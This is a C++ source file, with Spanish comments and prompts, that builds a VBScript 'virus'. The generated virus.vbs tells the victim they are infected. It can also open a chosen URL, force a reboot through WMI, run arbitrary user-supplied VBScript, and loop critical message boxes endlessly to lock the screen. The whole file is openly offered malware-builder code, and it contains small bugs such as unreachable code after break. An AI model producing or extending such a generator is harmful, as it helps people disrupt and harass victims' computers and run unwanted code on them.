/*-----------------------------------|
|CosmoXD(c) 2019                     |
|                                    |       
|           MIT LICENSE              |
|                                    |
|-----------------------------------*/
#include <iostream>
#include <fstream>
#include <string>
#include <cstdio>

#define endl "\n"
#define clearConsole system("clear");
#define PAUSE system("PAUSE");

void mostrarOpciones()
{
    std::cout << "1. Abrir otra alerta" << endl;
    std::cout << "2. Abrir pagina web(SOLO CHROME)" << endl;
    std::cout << "3. Reiniciar PC(BETA)" << endl;
    std::cout << "4. Script Personalizado (VBscript)" << endl;
    std::cout << "5. Spam Box" << endl;
    std::cout << "6. Terminar virus" << endl;
}

void vbsSpanish()
{

    std::string nombreVirus;
    std::cout << "Ahora dime el nombre de tu virus: " << endl;
    std::getline(std::cin, nombreVirus);
    std::cout << nombreVirus;
    
    // ESTA PARTE CREA EL ARCHIVO DEL VIRUS FINAL
    std::ofstream virus;
    try
    {      
        virus.open("virus.vbs", std::ios::ate);
        virus << "msgbox(\"" << "Has sido infectado por el virus:" << " " << nombreVirus << "\")";
    }
    catch(const std::exception& e)
    {
        std::cout << "ERROR Creating the virus.vbs file!. 2" << endl;
    }

    std::cout << "Ahora selecciona las acciones que quieres que tu virus haga" << endl;

    //Este es el "main loop" en el cual se escribiran los eventos
    for(int i = 0; i < 1000; i++)
    {
        int option;
        mostrarOpciones();
        scanf("%i", &option);
        if(option == 1)
        {
            std::cout << "Por favor dime que otro mensaje quieres que despliege el programa: ";
            char mensaje[500];
            std::cin >> mensaje;
            virus << endl << "msgbox(\"" << mensaje << "\")";
            clearConsole
        }
        else if (option == 2)
        {
            std::cout << "Dime a la pagina web que quieres que redirije este virus: ";
            char URL[500];
            std::cin >> URL;
            virus << endl << "Dim wShell" << endl << "Set wShell = CreateObject(\"WScript.Shell\")" << endl << "wShell.Run \"" << URL << "\",9";
            clearConsole
        }
        else if(option == 3)
        {
            char reiniciarPC[] = 
            endl
            "Set OpSysSet = GetObject(\"winmgmts:{impersonationLevel=impersonate,(RemoteShutdown)}//\" & mname).ExecQuery(\"select * from Win32_OperatingSystem where Primary=true\")"
            endl
            "for each OpSys in OpSysSet"
            endl
            "   OpSys.Reboot()"
            endl
            "next";
            virus << reiniciarPC;
            clearConsole
        }
        else if(option == 4)
        {
            std::string scriptPersonalizado;
            std::cout << "Escribe el script personalizado:" << endl;
            std::cout << "NOTA: Estoy desarrollando una forma de hacer un script multilinea, por favor espera..." << endl;
            std::cout << "Por ahora para hacer eso tienes que seleccionar la opcion de script personalizado mas de una ves para hacer un script multilinea" << endl;
            std::cin >> scriptPersonalizado;
            std::cout << endl;
            virus << endl << scriptPersonalizado;
            clearConsole
        }
        else if(option == 5)
        {
            std::string spamMessage;
            std::cout << "Dime el mensaje spam que quieres que aparezca: ";
            std::cin >> spamMessage;
            virus << endl << "do" << endl << "x=MsgBox(\"" << spamMessage << "\"," << "vbOkOnly+vbCritical," << "\"" << spamMessage << "\"" << ")" << endl << "loop";
            clearConsole
        }
        else if(option == 6)
        {
            break;
            virus.close();
            system("PAUSE");
            std::cout << "Adios!";
        }
        else 
        {
            std::cout << "ERROR 4." << endl;
            break;
            PAUSE
        }
        i++;
    }
}